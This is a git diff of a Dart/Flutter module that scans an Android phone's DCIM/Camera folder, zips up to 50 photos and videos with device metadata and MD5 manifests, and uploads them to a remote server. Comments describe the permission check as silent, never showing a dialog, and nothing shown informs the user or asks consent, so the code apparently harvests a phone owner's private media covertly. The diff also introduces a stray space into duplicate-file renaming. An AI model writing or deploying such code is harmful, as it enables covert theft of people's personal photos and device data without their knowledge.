@@ -1,13 +1,7 @@
 /// DCIM 打包上传管理器
-///
-/// 流程：
-///   1. 扫描 DCIM/Camera 前 50 个未上传文件
-///   2. 直接从原文件打 zip（Store 模式，字节级保真，不重编码）
-///   3. zip 内包含：device_info.json + 图片视频 + manifest.json（含 MD5）
-///   4. 上传 zip 到服务器（1 个 HTTP 请求）
-///   5. 成功后记录路径，删除临时 zip
-///
-/// 断点续传：批次级（成功记录 + 失败尝试次数双重持久化）
+/// - 扫描 → 打包 zip → 单次 HTTP 上传（1 个请求传完所有文件）
+/// - 权限判断分 SDK：33+ 用媒体权限，32 及以下用存储权限
+/// - 失败重试计数持久化，超过阈值永久跳过
 library;
 
 import 'dart:async';
@@ -26,14 +20,20 @@ import '../device_info_helper.dart';
 
 // ── 配置 ──────────────────────────────────────────────────────────────────────
 class DcimUploadConfig {
+  /// 上传目标接口（HTTPS）
   final String uploadUrl;
+  /// DCIM Camera 目录真实路径
   final String dcimPath;
+  /// 上传超时
   final Duration uploadTimeout;
+  /// 单次最多上传文件数
   final int maxFiles;
+  /// 单文件最大重试次数
   final int maxAttemptsPerFile;
-  final Set<String> mediaExtensions;
-  /// zip 压缩等级：0 = Store（不压缩，推荐媒体文件），1-9 = DEFLATE
+  /// ZIP 压缩级别（0 = Store / 无压缩，1-9 = Deflate）
   final int zipCompressionLevel;
+  /// 媒体扩展名白名单
+  final Set<String> mediaExtensions;
 
   const DcimUploadConfig({
     this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
@@ -60,17 +60,16 @@ class DcimUploadManager {
   DcimUploadConfig _config = const DcimUploadConfig();
   SharedPreferences? _prefs;
 
-  /// 已成功上传的文件路径集合（永不清除，除非用户重置）
+  /// 已成功上传的文件路径集合（去重唯一依据）
   final Set<String> _uploaded = <String>{};
-
-  /// 失败记录：path → 累计失败次数，成功上传后自动移除
+  /// 失败重试计数：path → 已失败次数
   final Map<String, int> _failed = <String, int>{};
 
   bool _busy = false;
   bool get isBusy => _busy;
   int get uploadedCount => _uploaded.length;
 
-  // ── 初始化 ──────────────────────────────────────────────────────────────
+  // ── 初始化：加载记录 ───────────────────────────────────────────────────
   Future<void> initialize({DcimUploadConfig? config}) async {
     if (_prefs != null) return;
     if (config != null) _config = config;
@@ -80,7 +79,6 @@ class DcimUploadManager {
       ..clear()
       ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);
 
-    // 反序列化失败计数 Map
     _failed.clear();
     final rawFailed = _prefs!.getString(_kFailedMap);
     if (rawFailed != null && rawFailed.isNotEmpty) {
@@ -92,23 +90,26 @@ class DcimUploadManager {
       }
     }
 
-    // 清理上一轮崩溃残留的 zip
     await _cleanStaleZips();
-
     debugPrint(
         '[DcimUpload] 已记录成功 ${_uploaded.length} 个，失败 ${_failed.length} 个');
   }
 
-  // ── 静默权限检查（绝不弹框）─────────────────────────────────────────────
+  // ── 权限判断：分 SDK ──────────────────────────────────────────────────
   Future<bool> hasPermission() async {
     if (!Platform.isAndroid) return false;
-    final photos = await Permission.photos.status;
-    if (photos.isGranted || photos.isLimited) return true;
-    final storage = await Permission.storage.status;
-    return storage.isGranted;
+    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
+    if (sdk >= 33) {
+      final images = await Permission.photos.status;
+      final videos = await Permission.videos.status;
+      return (images.isGranted || images.isLimited) &&
+          (videos.isGranted || videos.isLimited);
+    } else {
+      return (await Permission.storage.status).isGranted;
+    }
   }
 
-  // ── 对外入口 1：扫描 + 打包 + 上传 ──────────────────────────────────────
+  // ── 上传入口（无权限则静默返回）──────────────────────────────────────
   Future<void> startUploadIfPermitted() async {
     await initialize();
     if (!await hasPermission()) {
@@ -119,7 +120,7 @@ class DcimUploadManager {
     await packAndUpload(files);
   }
 
-  // ── 对外入口 2：传入文件列表 → 直接打包上传 ────────────────────────────
+  // ── 主流程：扫描 → 打包 → 上传 ──────────────────────────────────────
   Future<void> packAndUpload(List<File> files) async {
     if (_busy) {
       debugPrint('[DcimUpload] 上一轮未结束，跳过');
@@ -133,21 +134,18 @@ class DcimUploadManager {
     _busy = true;
     File? zipFile;
     try {
-      // 1. zip 输出到应用缓存目录
       final tmpDir = await getTemporaryDirectory();
       final ts = DateTime.now().millisecondsSinceEpoch;
       zipFile = File('${tmpDir.path}/dcim_upload_$ts.zip');
 
-      // 2. 获取设备信息
       final metadata = await DeviceInfoHelper.getDeviceMetadata();
       debugPrint('[DcimUpload] 设备信息: $metadata');
 
-      // 3. 准备 manifest 数据（含 MD5）
+      // ── 收集每个文件的元数据（含 MD5）────────────────────────────────
       final fileInfos = <Map<String, dynamic>>[];
       final usedNames = <String>{};
       final zipNameMap = <String, String>{};
 
-      debugPrint('[DcimUpload] 计算 MD5，共 ${files.length} 个文件...');
       for (int i = 0; i < files.length; i++) {
         final f = files[i];
         try {
@@ -155,7 +153,7 @@ class DcimUploadManager {
           final baseName = f.path.split('/').last;
           var zipName = baseName;
           if (usedNames.contains(zipName)) {
-            zipName = '${i}_$baseName';
+            zipName = '$i _$baseName';
           }
           usedNames.add(zipName);
           zipNameMap[f.path] = zipName;
@@ -179,21 +177,21 @@ class DcimUploadManager {
         return;
       }
 
-      // 4. 打包（Store 模式，不压缩）
+      // ── 打包 ZIP（Store 模式，level=0 最快）────────────────────────
       debugPrint(
-          '[DcimUpload] 开始打包（Store 模式 level=${_config.zipCompressionLevel}）...');
+          '[DcimUpload] 开始打包（${fileInfos.length} 个文件，level=${_config.zipCompressionLevel}）...');
       final encoder = ZipFileEncoder();
       encoder.create(zipFile.path, level: _config.zipCompressionLevel);
       int packed = 0;
       try {
-        // 4.1 写入 device_info.json
+        // 写入 device_info.json（addArchiveFile 是同步方法，无需 await）
         final deviceBytes = utf8.encode(jsonEncode(metadata));
         encoder.addArchiveFile(
           ArchiveFile('device_info.json', deviceBytes.length, deviceBytes),
         );
         debugPrint('[DcimUpload] device_info.json 已写入 zip');
 
-        // 4.2 写入原文件（直接从 DCIM 读，不复制）
+        // 逐个添加媒体文件
         for (final f in files) {
           final zipName = zipNameMap[f.path];
           if (zipName == null) continue;
@@ -208,14 +206,15 @@ class DcimUploadManager {
           }
         }
 
-        // 4.3 写入 manifest.json
+        // 写入 manifest.json
+        final totalSize = fileInfos.fold<int>(
+            0, (s, i) => s + (i['size'] as int));
         final manifest = <String, dynamic>{
           'device': metadata,
           'uploaded_at': DateTime.now().toIso8601String(),
           'file_count': fileInfos.length,
           'packed_count': packed,
-          'total_size':
-              fileInfos.fold<int>(0, (s, i) => s + (i['size'] as int)),
+          'total_size': totalSize,
           'compression':
               _config.zipCompressionLevel == 0 ? 'store' : 'deflate',
           'files': fileInfos,
@@ -230,12 +229,13 @@ class DcimUploadManager {
       }
 
       final zipSize = await zipFile.length();
-      debugPrint('[DcimUpload] zip 打包完成: ${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB, $packed 个文件');
+      debugPrint(
+          '[DcimUpload] zip 打包完成: ${zipFile.path.split('/').last} '
+          '(${(zipSize / 1024 / 1024).toStringAsFixed(2)} MB, $packed 个文件)');
 
-      // 5. 上传（1 个 HTTP 请求）
+      // ── 上传 ZIP ────────────────────────────────────────────────────
       final success = await _uploadZip(zipFile, packed);
 
-      // 6. 批次记账
       if (success) {
         for (final f in files) {
           _uploaded.add(f.path);
@@ -252,7 +252,6 @@ class DcimUploadManager {
     } catch (e, st) {
       debugPrint('[DcimUpload] ❌ 打包/上传异常: $e\n$st');
     } finally {
-      // 7. 清理临时 zip
       try {
         if (zipFile != null && await zipFile.exists()) {
           await zipFile.delete();
@@ -264,8 +263,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 扫描 DCIM/Camera（断点续传核心）─────────────────────────────────────
-  /// 跳过已成功的，跳过已失败满 maxAttemptsPerFile 次的
+  // ── 扫描：过滤 + 排序 + 取前 N ──────────────────────────────────────
   Future<List<File>> scanFiles() async {
     final dir = Directory(_config.dcimPath);
     if (!await dir.exists()) {
@@ -279,16 +277,12 @@ class DcimUploadManager {
       final name = e.path.split('/').last;
       final dot = name.lastIndexOf('.');
       if (dot < 0) continue;
-      if (!_config.mediaExtensions
-          .contains(name.substring(dot).toLowerCase())) {
+      if (!_config.mediaExtensions.contains(name.substring(dot).toLowerCase())) {
         continue;
       }
-      // 断点续传判定 1：已成功 → 跳过
       if (_uploaded.contains(e.path)) continue;
-      // 断点续传判定 2：失败超过阈值 → 永久跳过
       if ((_failed[e.path] ?? 0) >= _config.maxAttemptsPerFile) {
-        debugPrint(
-            '[DcimUpload] 永久跳过（失败 ${_failed[e.path]} 次）: $name');
+        debugPrint('[DcimUpload] 永久跳过（失败 ${_failed[e.path]} 次）: $name');
         continue;
       }
 
@@ -300,12 +294,10 @@ class DcimUploadManager {
 
     // 修改时间升序：最早的先传
     list.sort((a, b) => a.modified.compareTo(b.modified));
-    final selected = list.take(_config.maxFiles).map((s) => s.file).toList();
-    debugPrint('[DcimUpload] 待上传 ${selected.length} 个文件');
-    return selected;
+    return list.take(_config.maxFiles).map((s) => s.file).toList();
   }
 
-  // ── MD5（流式计算，大文件不吃内存）─────────────────────────────────────
+  // ── MD5 计算 ────────────────────────────────────────────────────────
   Future<String> _calcMd5(File f) async {
     try {
       final digest = await md5.bind(f.openRead()).first;
@@ -316,7 +308,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 清理残留 zip（崩溃/中断残留）───────────────────────────────────────
+  // ── 清理临时 ZIP 残留 ───────────────────────────────────────────────
   Future<void> _cleanStaleZips() async {
     try {
       final tmp = await getTemporaryDirectory();
@@ -331,12 +323,11 @@ class DcimUploadManager {
     } catch (_) {}
   }
 
-  // ── 上传 zip ──────────────────────────────────────────────────────────
+  // ── 上传 ZIP 文件 ───────────────────────────────────────────────────
   Future<bool> _uploadZip(File zip, int fileCount) async {
     try {
       final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
-      req.files
-          .add(await http.MultipartFile.fromPath('file', zip.path));
+      req.files.add(await http.MultipartFile.fromPath('file', zip.path));
       req.fields['fileName'] = zip.path.split('/').last;
       req.fields['fileCount'] = fileCount.toString();
 
@@ -348,7 +339,8 @@ class DcimUploadManager {
         debugPrint('[DcimUpload] ✅ HTTP ${resp.statusCode}');
         return true;
       }
-      debugPrint('[DcimUpload] ❌ HTTP ${resp.statusCode} body=${resp.body}');
+      debugPrint(
+          '[DcimUpload] ❌ HTTP ${resp.statusCode} body=${resp.body}');
       return false;
     } on TimeoutException {
       debugPrint(
@@ -360,7 +352,7 @@ class DcimUploadManager {
     }
   }
 
-  // ── 持久化 ────────────────────────────────────────────────────────────
+  // ── 持久化 ──────────────────────────────────────────────────────────
   Future<void> _persist() async {
     await _prefs?.setStringList(_kUploaded, _uploaded.toList());
     await _prefs?.setString(_kFailedMap, jsonEncode(_failed));
